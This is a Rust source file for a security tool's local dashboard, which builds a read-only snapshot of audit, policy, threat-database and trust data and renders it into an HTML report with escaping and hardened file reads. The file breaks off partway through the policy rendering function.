//! M13 ch3 — `tirith dashboard` snapshot model + self-contained HTML renderer.
//!
//! This module is the SECURITY-SENSITIVE half of the dashboard feature: it
//! assembles a [`DashboardSnapshot`] (pure, serde-serializable data — no HTML)
//! from existing read-only sources, then renders it into a STATIC,
//! self-contained HTML report from an embedded template.
//!
//! # Data sources (all read-only; degrade to "unavailable")
//!
//! * **Audit summary** — a 7-day window over the JSONL audit log read by
//!   [`crate::audit_aggregator::read_log`] + [`crate::audit_aggregator::compute_stats`].
//!   Counts by action, top findings (rule IDs), and a best-effort top-hosts
//!   tally extracted from the already-REDACTED command previews.
//! * **Policy** — built by [`build_policy_summary`] from
//!   [`crate::policy::Policy::discover_local_only`] (a STRICT LOCAL parse — it
//!   walks up for a local `policy.yaml`/`.yml` plus local overlays and performs
//!   NO network fetch) summarized (paranoia, fail mode, allowlist / blocklist /
//!   custom-rule counts).
//! * **Threat DB** — [`crate::threatdb::ThreatDb`] header/stats, mirroring
//!   `tirith threat-db status`. Degrades to "not installed".
//! * **Trust + canaries** — the user/repo `trust.json` stores (read directly,
//!   the same format `tirith trust` writes) and [`crate::canary::list`].
//! * **Shell hook** — supplied by the CLI caller (it owns the read-only profile
//!   probe `tirith onboard` / `doctor` use); core never materializes hooks.
//!
//! # The escaping invariant (local-report XSS)
//!
//! Audit entries carry redacted command previews and file paths built from
//! USER-CONTROLLED bytes. Interpolating them raw into HTML is a local-report
//! XSS: a pasted `<script>…` would execute when the operator opens the file (or
//! views it over the loopback `serve`). Therefore EVERY value substituted into
//! the template passes through [`html_escape`] — [`render_html`] has no
//! "raw/unescaped" interpolation path. See `escaping_neutralizes_script_tag`.
//!
//! The snapshot itself stores RAW (unescaped) strings — escaping happens only at
//! the HTML boundary. The `--json` surface emits the raw snapshot (JSON is not an
//! HTML execution context; a consumer that re-renders it into HTML is
//! responsible for its own escaping, exactly as with every other tirith `--json`
//! output).

use std::collections::HashMap;
use std::path::Path;

use serde::{Deserialize, Serialize};

use crate::audit_aggregator::{self, AuditFilter, AuditRecord};

/// The default look-back window, in days, for the audit summary.
pub const DEFAULT_WINDOW_DAYS: i64 = 7;

/// How many top findings / hosts the snapshot surfaces.
const TOP_N: usize = 10;

/// The embedded HTML template. Compiled into the binary so the report is
/// self-contained and the CLI never has to locate an on-disk asset.
const TEMPLATE_HTML: &str = include_str!("../assets/dashboard/template.html");

// ---------------------------------------------------------------------------
// Snapshot model — PURE DATA. No HTML, no I/O. serde-serializable for `--json`.
// ---------------------------------------------------------------------------

/// A point-in-time, local-only security snapshot. Pure data: assembled by
/// [`build_snapshot`], rendered by [`render_html`], or serialized as-is for
/// `--json`. Strings are stored RAW (unescaped); escaping is applied only when
/// rendering HTML.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DashboardSnapshot {
    /// Stable schema version (bump on a breaking field change).
    pub schema_version: u32,
    /// RFC-3339 UTC timestamp this snapshot was assembled.
    pub generated_at: String,
    /// The audit look-back window in days.
    pub window_days: i64,
    /// RFC-3339 UTC lower bound of the window (`generated_at - window_days`).
    pub window_start: String,
    /// RFC-3339 UTC upper bound of the window (== `generated_at`).
    pub window_end: String,

    /// The 7-day audit summary, or `None` when the log is absent / unreadable.
    pub audit: Option<AuditSummary>,
    /// Policy summary (always present — an absent policy collapses to defaults).
    pub policy: PolicySummary,
    /// Threat-DB status (always present; `installed = false` when none).
    pub threatdb: ThreatDbSummary,
    /// Trust-store + canary summary (always present; counts may be zero).
    pub trust: TrustSummary,
    /// Shell-hook install state, supplied by the CLI caller.
    pub hook: HookSummary,
}

/// A 7-day audit summary distilled from the JSONL log.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AuditSummary {
    /// Verdict-bearing commands seen in the window.
    pub total_commands: usize,
    /// Total findings across those commands.
    pub total_findings: usize,
    /// Block rate in `[0.0, 1.0]`.
    pub block_rate: f64,
    /// Distinct sessions seen.
    pub sessions_seen: usize,
    /// Count by action (`Allow` / `Warn` / `Block` / …), sorted by action name.
    pub actions: Vec<(String, usize)>,
    /// Top rule IDs by occurrence (descending), capped at [`TOP_N`].
    pub top_findings: Vec<(String, usize)>,
    /// Top hosts by occurrence (descending), capped at [`TOP_N`]. Best-effort:
    /// extracted from the REDACTED command previews, so it may be empty even
    /// when commands were seen.
    pub top_hosts: Vec<(String, usize)>,
    /// Audit lines that failed to parse (surfaced so a corrupt log is visible).
    pub skipped_lines: usize,
}

/// A summary of the effective discovered policy.
///
/// Three states are distinguished so the dashboard never presents a BROKEN
/// policy as benign built-in defaults (a misleading fail-open dashboard —
/// CodeRabbit M13 PR #132 R5-1):
///
/// * **No policy file** — the genuine built-in defaults apply. The numeric
///   fields are populated, `path` is `None`, and `error` is `None`.
/// * **Valid policy file** — the parsed values are populated, `path` is the
///   file's path, and `error` is `None`.
/// * **Present-but-unparseable policy file** — `error` carries the load/parse
///   failure (and `path` the file that failed). The numeric fields are `None`
///   because a policy that did not load has NO known paranoia / fail mode /
///   counts; surfacing zeros/defaults here would be the exact fail-open lie
///   this representation exists to prevent.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PolicySummary {
    /// Paranoia tier (1–4). `None` when the policy file failed to load.
    pub paranoia: Option<u8>,
    /// `"open"` or `"closed"`. `None` when the policy file failed to load.
    pub fail_mode: Option<String>,
    /// Number of allowlist entries (flat patterns). `None` when load failed.
    pub allowlist_count: Option<usize>,
    /// Number of rule-scoped allowlist entries. `None` when load failed.
    pub allowlist_rules_count: Option<usize>,
    /// Number of blocklist entries. `None` when load failed.
    pub blocklist_count: Option<usize>,
    /// Number of custom rules. `None` when load failed.
    pub custom_rules_count: Option<usize>,
    /// Discovered policy path, if any. Populated even when `error` is set (we
    /// know WHICH file failed to parse).
    pub path: Option<String>,
    /// The load/parse error when a policy file is present but unparseable.
    /// `None` for both the valid-policy and no-policy-file cases.
    pub error: Option<String>,
}

/// Threat-DB status, mirroring `tirith threat-db status`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ThreatDbSummary {
    /// A DB file is present and loaded.
    pub installed: bool,
    /// Expected / actual DB path.
    pub path: Option<String>,
    /// Age of the DB in hours (when installed).
    pub age_hours: Option<f64>,
    /// DB build sequence (when installed).
    pub build_sequence: Option<u64>,
    /// Total records across all sections (when installed).
    pub total_entries: Option<u64>,
    /// Ed25519 signature verified (when installed).
    pub signature_valid: Option<bool>,
    /// Load/parse error, if the DB exists but could not be read.
    pub error: Option<String>,
}

/// Trust-store + canary summary.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TrustSummary {
    /// Non-expired trust entries in the USER store (`config_dir()/trust.json`).
    pub user_trust_count: usize,
    /// Non-expired trust entries in the REPO store (`.tirith/trust.json`).
    pub repo_trust_count: usize,
    /// Registered canary tokens.
    pub canary_count: usize,
    /// Canary tokens with an opt-in callback URL configured.
    pub canary_with_callback: usize,
}

/// Shell-hook install state. Populated by the CLI caller (which owns the
/// read-only profile probe); core does not detect or materialize hooks.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HookSummary {
    /// The detected interactive shell (e.g. `"zsh"`), or `"unknown"`.
    pub shell: String,
    /// The hook line is present in the shell's profile.
    pub installed: bool,
}

// ---------------------------------------------------------------------------
// Snapshot assembly
// ---------------------------------------------------------------------------

/// Assemble a [`DashboardSnapshot`].
///
/// * `audit_log` — path to the JSONL audit log, or `None` to use the default
///   ([`crate::audit::audit_log_path`]). When the file is absent or unreadable
///   the `audit` field degrades to `None` rather than failing.
/// * `cwd` — directory used for policy / trust discovery (walks up to `.git`).
///   `None` uses the process cwd.
/// * `hook` — shell-hook state from the caller's read-only probe.
///
/// Pure with respect to the working tree: it only READS the audit log, policy,
/// threat DB, trust stores, and canary store. It never writes or materializes
/// anything.
pub fn build_snapshot(
    audit_log: Option<&Path>,
    cwd: Option<&str>,
    hook: HookSummary,
) -> DashboardSnapshot {
    let now = chrono::Utc::now();
    let window_start = now - chrono::Duration::days(DEFAULT_WINDOW_DAYS);

    let audit = build_audit_summary(audit_log, &window_start.to_rfc3339(), &now.to_rfc3339());
    let policy = build_policy_summary(cwd);
    let threatdb = build_threatdb_summary();
    let trust = build_trust_summary(cwd);

    DashboardSnapshot {
        schema_version: 1,
        generated_at: now.to_rfc3339(),
        window_days: DEFAULT_WINDOW_DAYS,
        window_start: window_start.to_rfc3339(),
        window_end: now.to_rfc3339(),
        audit,
        policy,
        threatdb,
        trust,
        hook,
    }
}

/// Build the 7-day audit summary. Returns `None` when no log path resolves or
/// the file cannot be read (a fresh install with no log is the common case).
fn build_audit_summary(audit_log: Option<&Path>, since: &str, until: &str) -> Option<AuditSummary> {
    let path = match audit_log {
        Some(p) => p.to_path_buf(),
        None => crate::audit::audit_log_path()?,
    };
    if !path.exists() {
        return None;
    }
    let read = audit_aggregator::read_log(&path).ok()?;

    let filter = AuditFilter {
        since: Some(since.to_string()),
        until: Some(until.to_string()),
        entry_type: Some("verdict".to_string()),
        ..Default::default()
    };
    let windowed = audit_aggregator::filter_records(&read.records, &filter);
    let stats = audit_aggregator::compute_stats(&windowed);

    let mut actions: Vec<(String, usize)> = stats.actions.into_iter().collect();
    actions.sort_by(|a, b| a.0.cmp(&b.0));

    let top_hosts = top_hosts(&windowed);

    Some(AuditSummary {
        total_commands: stats.total_commands,
        total_findings: stats.total_findings,
        block_rate: stats.block_rate,
        sessions_seen: stats.sessions_seen,
        actions,
        top_findings: stats.top_rules,
        top_hosts,
        skipped_lines: read.skipped_lines,
    })
}

/// Best-effort top-hosts tally from the REDACTED command previews.
///
/// The audit `command_redacted` field is DLP-redacted and truncated to 80
/// bytes, so this is intentionally lossy — a host whose URL was truncated or
/// redacted simply does not appear. We reuse the engine's own URL extractor
/// (`extract::extract_urls`) + host parser (`parse::extract_raw_host`) so the
/// notion of "a host" matches the rest of tirith rather than a bespoke regex.
fn top_hosts(records: &[AuditRecord]) -> Vec<(String, usize)> {
    let mut counts: HashMap<String, usize> = HashMap::new();
    for r in records {
        let urls =
            crate::extract::extract_urls(&r.command_redacted, crate::tokenize::ShellType::Posix);
        for u in urls {
            if let Some(host) = u.parsed.host() {
                let host = host.trim().to_ascii_lowercase();
                if !host.is_empty() {
                    *counts.entry(host).or_insert(0) += 1;
                }
            }
        }
    }
    let mut hosts: Vec<(String, usize)> = counts.into_iter().collect();
    // Sort by descending count, then host name for a stable, deterministic order.
    hosts.sort_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.cmp(&b.0)));
    hosts.truncate(TOP_N);
    hosts
}

/// Read cap for the discovered local policy file. A `.tirith/policy.yaml` is a
/// small hand-authored document; 1 MiB is far above any legitimate size and
/// bounds the in-memory buffer when the path is attacker-influenced.
const POLICY_READ_CAP: u64 = 1024 * 1024;

/// Read cap for a `trust.json` store. The dashboard only counts entries, so even
/// a large store is bounded well under this for the snapshot's purposes.
const TRUST_READ_CAP: u64 = 1024 * 1024;

/// Render a [`crate::util::OpenRegularError`] as a short, human-readable reason
/// for the dashboard's policy `error` state. `OpenRegularError` has no `Display`
/// impl (callers elsewhere match its variants), so map each variant here, keeping
/// the wording consistent with the FIFO/device/oversize hardening it reports.
fn open_error_text(e: &crate::util::OpenRegularError) -> String {
    match e {
        crate::util::OpenRegularError::NotFound => "file not found".to_string(),
        crate::util::OpenRegularError::NotRegularFile => {
            "not a regular file (FIFO, device, socket, or directory)".to_string()
        }
        crate::util::OpenRegularError::TooLarge => "exceeds read cap".to_string(),
        crate::util::OpenRegularError::Io(io) => io.to_string(),
    }
}

/// Summarize the EFFECTIVE policy the engine enforces, while still surfacing a
/// broken LOCAL policy file rather than masking it as benign defaults.
///
/// # Two concerns, two mechanisms
///
/// 1. **Counts must match what `analyze()` actually enforces — but OFFLINE.**
///    The engine does NOT enforce the bare local `policy.yaml`: in
///    `engine::analyze_inner` it builds the effective policy as
///    `Policy::discover(cwd)` (local resolution + optional remote replacement +
///    incident `apply_runtime_overrides`) followed by the read-only overlay
///    helpers `load_user_lists()`, `load_org_lists(cwd)` and
///    `load_trust_entries(cwd)`. Those overlays APPEND to `allowlist`,
///    `allowlist_rules` and `blocklist` (user/org flat-file lists + non-expired
///    `trust.json` entries). Summarizing only the strict local parse (round 5)
///    UNDER-reports the active allow/block counts versus enforcement (CodeRabbit
///    M13 PR #132 R6-1). So we reproduce that sequence here for the COUNTS — but
///    via `Policy::discover_local_only(cwd)` rather than `Policy::discover`,
///    because the dashboard is a local, offline reporting surface whose embedded
///    report promises it "makes no network calls". `discover` would fetch the
///    REMOTE policy whenever a policy server is configured (env or local file);
///    `discover_local_only` mirrors `discover`'s LOCAL behavior (local file +
///    incident overrides) while skipping every remote-fetch branch, so a render
///    can never hit the network (CodeRabbit M13 PR #132 R9-2). The local file +
///    user/org/trust overlays is the effective LOCAL policy, with zero I/O off
///    the box.
///
/// 2. **A broken local file must NOT read as safe defaults.** `Policy::discover`
///    fails CLOSED on an unparseable named file (it returns a block-everything
///    policy, not the open default) — but it does so SILENTLY for the dashboard:
///    a malformed `.tirith/policy.yaml` would render as a populated summary with
///    no indication that the operator's real policy never loaded. On a security
///    dashboard that is the fail-open lie this representation exists to prevent
///    (CodeRabbit M13 PR #132 R5-1). So we ADDITIONALLY do a STRICT local parse
///    (the same `discover_local_policy_path` + [`crate::policy::Policy::try_parse_yaml`]
///    idiom `tirith policy validate` uses) purely to DETECT a broken local file
///    and set the `error` state.
///
/// # Resulting states
///
/// * Broken LOCAL policy file → `error` populated, numeric fields `None`, `path`
///   set (the hard-error state; takes precedence — counts are meaningless when
///   the operator's file did not load).
/// * No local policy file → the effective defaults + overlays (NOT an error;
///   the common fresh-install case). `path` is `None` only when discovery found
///   no file at all.
/// * Valid local policy file → the EFFECTIVE summary (local parse + overlays),
///   `error` `None`.
///
/// Overlay application is non-fatal: each `load_*` helper is itself read-only and
/// degrades internally (a corrupt overlay source is skipped with a diagnostic,
/// never a panic), so the strict local parse is the only hard-error state.
fn build_policy_summary(cwd: Option<&str>) -> PolicySummary {
    // (1) Strict local parse FIRST — this is the ONLY hard-error state. A
    // present-but-unparseable local file must surface as "unavailable" instead
    // of any populated summary (which `Policy::discover`'s fail-closed default
    // would otherwise silently present).
    if let Some(path) = crate::policy::discover_local_policy_path(cwd) {
        let path_str = path.display().to_string();
        // HARDENED READ (CodeRabbit M13 PR #132 R23): `discover_local_policy_path`
        // returns a repo-CONTROLLED path. A plain `std::fs::read_to_string` follows
        // symlinks, applies no size cap, and would BLOCK on a FIFO/device — so a
        // `.tirith/policy.yaml` symlinked at `/dev/zero` (or a multi-GiB file) could
        // hang or OOM the render. Route through the shared, race-free
        // `read_regular_capped`: it opens with `O_NONBLOCK`, `fstat`s the OPEN fd
        // (rejecting non-regular files without blocking), and caps the body. Its
        // error maps into the SAME `policy_summary_error` fail-closed state a read
        // failure already produced, preserving the `path_str` context.
        let content = match crate::util::read_regular_capped(&path, POLICY_READ_CAP) {
            Ok(bytes) => match String::from_utf8(bytes) {
                Ok(s) => s,
                Err(e) => {
                    return policy_summary_error(
                        path_str,
                        format!("cannot read: not valid UTF-8: {e}"),
                    )
                }
            },
            Err(e) => {
                return policy_summary_error(
                    path_str,
                    format!("cannot read: {}", open_error_text(&e)),
                )
            }
        };
        if let Err(e) = crate::policy::Policy::try_parse_yaml(&content) {
            return policy_summary_error(path_str, e);
        }
    }

    // (2) Local file parsed (or there is none): build the EFFECTIVE LOCAL
    // policy the same way `engine::analyze_inner` does, so the surfaced counts
    // match what is actually enforced (local discovery + the read-only overlay
    // helpers). We use `discover_local_only` rather than `discover` so the
    // dashboard NEVER makes a network call: `discover` would invoke
    // `fetch_remote_policy` whenever `TIRITH_SERVER_URL`+`TIRITH_API_KEY` (or
    // the local file's `policy_server_url`/`policy_server_api_key`) are set, but
    // the embedded report promises it "makes no network calls" and is a local,
    // offline reporting surface (CodeRabbit M13 PR #132 R9-2). The local-only
    // path still applies the incident-mode runtime overrides (a local concern).
    // Each overlay is internally non-fatal (read-only, degrades on a corrupt
    // source).
    let mut policy = crate::policy::Policy::discover_local_only(cwd);
    policy.load_user_lists();
    policy.load_org_lists(cwd);
    policy.load_trust_entries(cwd);

    policy_summary_from(&policy, policy.path.clone())
}

/// Build a populated [`PolicySummary`] from a successfully-loaded policy.
fn policy_summary_from(policy: &crate::policy::Policy, path: Option<String>) -> PolicySummary {
    PolicySummary {
        paranoia: Some(policy.paranoia),
        fail_mode: Some(match policy.fail_mode {
            crate::policy::FailMode::Open => "open".to_string(),
            crate::policy::FailMode::Closed => "closed".to_string(),
        }),
        allowlist_count: Some(policy.allowlist.len()),
        allowlist_rules_count: Some(policy.allowlist_rules.len()),
        blocklist_count: Some(policy.blocklist.len()),
        custom_rules_count: Some(policy.custom_rules.len()),
        path,
        error: None,
    }
}

/// Build an error [`PolicySummary`] for a present-but-unparseable policy file.
/// Numeric fields are `None` — a policy that did not load has no known values.
fn policy_summary_error(path: String, error: String) -> PolicySummary {
    PolicySummary {
        paranoia: None,
        fail_mode: None,
        allowlist_count: None,
        allowlist_rules_count: None,
        blocklist_count: None,
        custom_rules_count: None,
        path: Some(path),
        error: Some(error),
    }
}

/// Summarize threat-DB status, mirroring `tirith threat-db status`. Degrades to
/// `installed = false` when no DB file is present.
fn build_threatdb_summary() -> ThreatDbSummary {
    use crate::threatdb::ThreatDb;

    let db_path = ThreatDb::default_path();
    let path_str = db_path.as_ref().map(|p| p.display().to_string());

    let exists = db_path.as_ref().map(|p| p.exists()).unwrap_or(false);
    if !exists {
        return ThreatDbSummary {
            installed: false,
            path: path_str,
            age_hours: None,
            build_sequence: None,
            total_entries: None,
            signature_valid: None,
            error: None,
        };
    }

    let path_ref = db_path.as_ref().expect("path exists when exists==true");
    match ThreatDb::load_from_path(path_ref, 0) {
        Ok(db) => {
            let sig_valid = db.verify_signature().is_ok();
            let stats = db.stats();
            let now = chrono::Utc::now().timestamp().max(0) as u64;
            let age_hours = now.saturating_sub(stats.build_timestamp) as f64 / 3600.0;
            let total = stats.package_count as u64
                + stats.hostname_count as u64
                + stats.ip_count as u64
                + stats.typosquat_count as u64
                + stats.popular_count as u64;
            ThreatDbSummary {
                installed: true,
                path: path_str,
                age_hours: Some(age_hours),
                build_sequence: Some(stats.build_sequence),
                total_entries: Some(total),
                signature_valid: Some(sig_valid),
                error: None,
            }
        }
        Err(e) => ThreatDbSummary {
            installed: true,
            path: path_str,
            age_hours: None,
            build_sequence: None,
            total_entries: None,
            signature_valid: None,
            error: Some(e.to_string()),
        },
    }
}

/// The minimal `trust.json` shape needed to count non-expired entries. Mirrors
/// the format `tirith trust` writes (`{version, entries:[{ttl_expires, …}]}`),
/// but kept local + lenient (extra fields ignored) so core does not depend on
/// the CLI crate's struct.
#[derive(Debug, Deserialize)]
struct TrustStoreFile {
    #[serde(default)]
    entries: Vec<TrustEntryFile>,
}

#[derive(Debug, Deserialize)]
struct TrustEntryFile {
    #[serde(default)]
    ttl_expires: Option<String>,
}

/// Count non-expired entries in a `trust.json` at `path`. A missing or
/// unparseable file counts as zero (degrade gracefully — never panic).
fn count_trust_entries(path: &Path) -> usize {
    count_trust_entries_at(path, chrono::Utc::now())
}

/// Inner of [`count_trust_entries`] with the comparison instant injected, so the
/// `>= now` boundary is deterministically testable (a literal `Utc::now()`
/// entry advances past `now` before the check runs, hiding the `>` vs `>=`
/// distinction).
fn count_trust_entries_at(path: &Path, now: chrono::DateTime<chrono::Utc>) -> usize {
    // HARDENED READ (CodeRabbit M13 PR #132 R23): `path` is a repo-CONTROLLED
    // `.tirith/trust.json`. As with the policy read above, a plain
    // `read_to_string` would follow a symlink to a FIFO/device (blocking the
    // render) or apply no size cap. Route through the race-free
    // `read_regular_capped`; a non-regular/oversize/unreadable file collapses to
    // the SAME zero-count safe path a missing-or-unparseable file already takes.
    let Ok(bytes) = crate::util::read_regular_capped(path, TRUST_READ_CAP) else {
        return 0;
    };
    let Ok(content) = String::from_utf8(bytes) else {
        return 0;
    };
    let Ok(store) = serde_json::from_str::<TrustStoreFile>(&content) else {
        return 0;
    };
    store
        .entries
        .iter()
        .filter(|e| match &e.ttl_expires {
            None => true, // permanent
            Some(ts) => match chrono::DateTime::parse_from_rfc3339(ts) {
                // `>= now`, not `> now`: `Policy::merge_trust_store` only expires
                // an entry when `expiry < now`, so an entry whose `ttl_expires`
                // is EXACTLY `now` is still ACTIVE at runtime. Match that boundary
                // so the snapshot's live-trust count agrees with what the engine
                // enforces (CodeRabbit M13 PR #132 R17-2).
                Ok(expiry) => expiry >= now,
                // An unparseable expiry is treated as EXPIRED (inactive), matching
                // runtime trust enforcement, which skips entries whose `ttl_expires`
                // cannot be parsed rather than honoring them. Counting a malformed
                // TTL as active would overstate the live trust surface in the
                // snapshot relative to what the engine actually applies
                // (CodeRabbit M13 PR #132 R3-2).
                Err(_) => false,
            },
        })
        .count()
}

/// Summarize the trust stores + canary store. All sources degrade to zero when
/// absent.
fn build_trust_summary(cwd: Option<&str>) -> TrustSummary {
    let user_trust_count = crate::policy::config_dir()
        .map(|d| count_trust_entries(&d.join("trust.json")))
        .unwrap_or(0);

    let repo_trust_count = crate::policy::find_repo_root(cwd)
        .map(|root| count_trust_entries(&root.join(".tirith").join("trust.json")))
        .unwrap_or(0);

    let canaries = crate::canary::list();
    let canary_count = canaries.len();
    let canary_with_callback = canaries.iter().filter(|c| c.callback_url.is_some()).count();

    TrustSummary {
        user_trust_count,
        repo_trust_count,
        canary_count,
        canary_with_callback,
    }
}

// ---------------------------------------------------------------------------
// HTML rendering — the ONLY place snapshot strings cross into HTML.
// ---------------------------------------------------------------------------

/// Number of random bytes in a `serve` token before hex-encoding. 32 bytes =
/// 256 bits of OS entropy → a 64-char hex token.
const SERVE_TOKEN_BYTES: usize = 32;

/// Generate a fresh ephemeral token for `tirith dashboard serve`:
/// [`SERVE_TOKEN_BYTES`] of OS entropy, lower-hex encoded.
///
/// Uses `getrandom::fill` — the SAME OS CSPRNG the canary store and the
/// per-install baseline salt draw from (no new crypto dependency). It lives in
/// core so the CLI does not need its own RNG dep. On the (astronomically
/// unlikely) event entropy is unavailable it returns `Err` rather than emitting
/// a guessable token — a weak token would defeat the whole loopback guard.
pub fn generate_serve_token() -> Result<String, String> {
    let mut buf = [0u8; SERVE_TOKEN_BYTES];
    getrandom::fill(&mut buf).map_err(|e| format!("OS RNG unavailable: {e}"))?;
    let mut hex = String::with_capacity(SERVE_TOKEN_BYTES * 2);
    for b in buf {
        use std::fmt::Write as _;
        // Infallible write into a String.
        let _ = write!(hex, "{b:02x}");
    }
    Ok(hex)
}

/// Escape HTML special characters for safe interpolation into the report.
///
/// The order matters: `&` MUST be escaped FIRST, otherwise the `&` introduced
/// by a later replacement (e.g. `<` → `&lt;`) would itself be re-escaped into
/// `&amp;lt;`. After that the remaining characters are independent.
///
/// Covers the five characters that can break out of HTML text / attribute
/// contexts: `&`, `<`, `>`, `"`, `'`. (`'` is escaped as the numeric
/// `&#x27;` because the named `&apos;` is not defined in HTML4.)
pub fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#x27;")
}

/// Render a [`DashboardSnapshot`] into a self-contained HTML report.
///
/// EVERY interpolated value passes through [`html_escape`]; there is no
/// raw-interpolation path. Numeric values are formatted via `format!` (no
/// user-controlled bytes) but still composed only into escaped text nodes.
pub fn render_html(snap: &DashboardSnapshot) -> String {
    // The full substitution table. The values are pre-escaped here so the
    // template fill is a single uniform pass — no caller can add a "raw" entry.
    let block_rate = snap
        .audit
        .as_ref()
        .map(|a| format!("{:.1}%", a.block_rate * 100.0))
        .unwrap_or_else(|| "—".to_string());
    let (total_commands, total_findings, sessions_seen) = snap
        .audit
        .as_ref()
        .map(|a| {
            (
                a.total_commands.to_string(),
                a.total_findings.to_string(),
                a.sessions_seen.to_string(),
            )
        })
        .unwrap_or_else(|| ("—".to_string(), "—".to_string(), "—".to_string()));

    let subs: &[(&str, String)] = &[
        ("{{GENERATED_AT}}", html_escape(&snap.generated_at)),
        (
            "{{WINDOW_DAYS}}",
            html_escape(&snap.window_days.to_string()),
        ),
        ("{{WINDOW_START}}", html_escape(&snap.window_start)),
        ("{{WINDOW_END}}", html_escape(&snap.window_end)),
        ("{{TOTAL_COMMANDS}}", html_escape(&total_commands)),
        ("{{TOTAL_FINDINGS}}", html_escape(&total_findings)),
        ("{{BLOCK_RATE}}", html_escape(&block_rate)),
        ("{{SESSIONS_SEEN}}", html_escape(&sessions_seen)),
        ("{{ACTIVITY_SECTION}}", render_activity(&snap.audit)),
        (
            "{{TOP_FINDINGS_SECTION}}",
            render_count_table(
                snap.audit.as_ref().map(|a| a.top_findings.as_slice()),
                "Rule",
                "No findings recorded in this window.",
            ),
        ),
        (
            "{{TOP_HOSTS_SECTION}}",
            render_count_table(
                snap.audit.as_ref().map(|a| a.top_hosts.as_slice()),
                "Host",
                "No hosts extracted from the recorded commands in this window.",
            ),
        ),
        ("{{POLICY_SECTION}}", render_policy(&snap.policy)),
        ("{{THREATDB_SECTION}}", render_threatdb(&snap.threatdb)),
        ("{{TRUST_SECTION}}", render_trust(&snap.trust)),
        ("{{HOOK_SECTION}}", render_hook(&snap.hook)),
    ];

    expand_template(TEMPLATE_HTML, subs)
}

/// Expand `{{MARKER}}` placeholders in `template` in a SINGLE left-to-right
/// pass, looking each marker up in `subs`. Because we scan the ORIGINAL
/// template (never the growing output), a substituted value that happens to
/// contain another marker — e.g. a user-controlled snapshot string holding the
/// literal `{{HOOK_SECTION}}` — is emitted verbatim and is NEVER re-scanned or
/// re-substituted (CodeRabbit M13 finding R2). All replacement values are
/// already HTML-escaped by the caller, so this introduces no raw-interpolation
/// path. Unknown markers are left intact (matched by the
/// `render_html_has_no_unreplaced_placeholders` test, which asserts the
/// template uses only known markers).
fn expand_template(template: &str, subs: &[(&str, String)]) -> String {
    let mut out = String::with_capacity(template.len());
    let mut rest = template;
    while let Some(start) = rest.find("{{") {
        out.push_str(&rest[..start]);
        let after_open = &rest[start..];
        match after_open.find("}}") {
            Some(end) => {
                // `marker` spans the full `{{…}}` token, inclusive of braces,
                // to match the keys in `subs`.
                let marker = &after_open[..end + 2];
                match subs.iter().find(|(m, _)| *m == marker) {
                    Some((_, value)) => out.push_str(value),
                    // Unknown marker: emit it unchanged. Crucially we do NOT
                    // rescan it, so it can never trigger nested expansion.
                    None => out.push_str(marker),
                }
                rest = &after_open[end + 2..];
            }
            None => {
                // No closing `}}` — the remainder is literal template text.
                out.push_str(after_open);
                rest = "";
                break;
            }
        }
    }
    out.push_str(rest);
    out
}

/// A `<table>` of `(key, count)` rows, or an `unavailable`/`empty` note.
fn render_count_table(
    rows: Option<&[(String, usize)]>,
    key_header: &str,
    empty_msg: &str,
) -> String {
    match rows {
        None => format!(
            "<p class=\"unavailable\">{}</p>",
            html_escape("Audit log unavailable — no data for this section.")
        ),
        Some([]) => format!("<p class=\"empty\">{}</p>", html_escape(empty_msg)),
        Some(rows) => {
            let mut s = format!(
                "<table><tr><th>{}</th><th>Count</th></tr>",
                html_escape(key_header)
            );
            for (k, count) in rows {
                s.push_str(&format!(
                    "<tr><td>{}</td><td>{}</td></tr>",
                    html_escape(k),
                    html_escape(&count.to_string()),
                ));
            }
            s.push_str("</table>");
            s
        }
    }
}

/// The action breakdown table (or an unavailable note when no audit log).
fn render_activity(audit: &Option<AuditSummary>) -> String {
    let Some(a) = audit else {
        return format!(
            "<p class=\"unavailable\">{}</p>",
            html_escape("No audit log found. Once tirith logs activity it will appear here.")
        );
    };
    let mut s = String::new();
    if a.actions.is_empty() {
        s.push_str(&format!(
            "<p class=\"empty\">{}</p>",
            html_escape("No commands recorded in this window.")
        ));
    } else {
        s.push_str("<table><tr><th>Action</th><th>Count</th></tr>");
        for (action, count) in &a.actions {
            s.push_str(&format!(
                "<tr><td>{}</td><td>{}</td></tr>",
                html_escape(action),
                html_escape(&count.to_string()),
            ));
        }
        s.push_str("</table>");
    }
    if a.skipped_lines > 0 {
        s.push_str(&format!(
            "<p class=\"unavailable\">{}</p>",
            html_escape(&format!(
                "{} audit line(s) could not be parsed and were skipped.",
                a.skipped_lines
            ))
        ));
    }
    s
}

/// The policy key/value block.
///
/// A present-but-unparseable policy file (`error` set) renders an explicit
/// "policy unavailable" notice with the parse error rather than the numeric
/// fields — surfacing that policy loading FAILED instead of presenting benign
/// built-in defaults (CodeRabbit M13 PR #132 R5-1). Like every other value, the
/// path and error are HTML-escaped.
fn render_policy(p: &PolicySummary) -> String {
    if let Some(err) = &p.error {
        let path = p.path.as_deref().unwrap_or("(unknown)");
        return format!(
            "<p class=\"unavailable\">{} <code>{}</code> {} {}</p>",
            html_escape("Policy unavailable — the policy file at"),
            html_escape(path),
            html_escape("could not be loaded:"),
            html_escape(err),
        );
    }
    // A dash for any numeric field that is unexpectedly absent without an error
    // set (should not happen for a loaded/no-file policy, but render safely).
    let num = |v: Option<usize>| v.map(|n| n.to_string()).unwrap_or_else(|| "—".to_string());
    let paranoia = p
        .paranoia
        .map(|n| n.to_string())
        .unwrap_or_else(|| "—".to_string());
    let fail_mode = p.fail_mode.as_deref().unwrap_or("—");
    let path = p.path.as_deref().unwrap_or("(none — built-in defaults)");
    format!(
        "<div class=\"kv\">\
         <div><span class=\"k\">Paranoia tier</span>{}</div>\
         <div><span class=\"k\">Fail mode</span>{}</div>\
         <div><span class=\"k\">Allowlist entries</span>{}</div>\
         <div><span class=\"k\">Allowlist rules</span>{}</div>\
         <div><span class=\"k\">Blocklist entries</span>{}</div>\
         <div><span class=\"k\">Custom rules</span>{}</div>\
         <div><span class=\"k\">Policy file</span><code>{}</code></div>\
         </div>",
        html_escape(&paranoia),
        html_escape(fail_mode),
